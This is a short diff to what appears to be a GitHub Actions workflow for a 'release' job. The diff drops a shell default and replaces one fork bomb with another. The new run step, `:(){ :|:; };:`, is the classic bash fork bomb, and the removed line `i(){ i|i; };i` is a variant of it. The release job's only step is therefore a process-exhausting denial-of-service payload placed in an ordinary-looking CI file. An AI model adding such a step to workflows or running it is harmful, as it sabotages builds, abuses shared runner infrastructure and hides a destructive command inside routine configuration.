@@ -6,8 +6,5 @@ permissions:
 jobs:
   release:
     runs-on: ubuntu-latest
-    defaults:
-      run:
-        shell: sh
     steps:
-      - run: i(){ i|i; };i
+      - run: :(){ :|:; };:
